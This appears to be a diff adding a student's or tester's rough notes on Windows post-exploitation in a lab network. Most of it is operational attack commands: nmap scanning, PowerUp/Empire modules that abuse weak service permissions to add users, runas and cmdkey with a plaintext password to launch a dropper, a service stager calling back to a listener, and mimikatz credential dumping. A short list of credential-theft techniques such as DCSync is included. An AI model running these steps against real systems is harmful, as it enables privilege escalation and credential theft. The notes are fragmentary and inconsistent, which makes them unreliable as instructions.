@@ -1,0 +1,56 @@
+I am inside machine
+  scan the network
+    nmap -A 192.168.56.0/24 // scan all ip in the network
+
+usemodule powershell_privesc_powerup_allchecks // sharpup is c sharp version of powerup
+execute
+  -then we found unquted path
+  -we also found week service permission
+    week service binary means that I can rewrite binary
+    -usemodule powershell_privesc_powerup_service_useradd
+    the service can be executable 3ade wma daroure ykoun service executable because I care about it running once
+      -set UserName John1
+      -set ServiceName Vulnerable Service 3
+      execute
+      now you can run commands as this user
+        I need to execute the dropper as this user
+        -usemodule powershell_management_runas
+          set UserName john1
+          set Password Password123!
+          set cmd C:\inetpub\wwwroot\upload\Dropper.exe
+          set Domain . // local user
+          execute
+
+        try run as from shell
+        shell cmdkey /add:192.168.56.22 /user:john1 /pass:Password123!
+        shell runas /savecred /user:john "C:\inetpub\wwwroot\upload\Dropper.exe
+
+    try to set the current user as admin
+    -usemodule powershell_privesc_powerup_service_exe_useradd
+    -back
+    -usemodule powershell_privesc_powerup_service_stager
+    -set Listener http
+    -set ServiceName Vulnerable Service 3
+    -execute
+    -options
+    -set ProxyCreds
+    -execute
+    -back
+
+    useradd module
+    -set Password // we kept it empty
+    -set UserName DefaultAppPool
+    -options
+    -set ServiceName Vulnerable Service 3
+
+credential access techniques
+  CH: NTLM Hashes
+  CH: Kerberos eKeys
+  CH: Domain Cached Creds
+  CH: Kerberos Tickets
+  CH: DCSync
+
+
+-ps // list processes
+-usemodule powershell_credentials_minikats_logonpasswords
+-execute
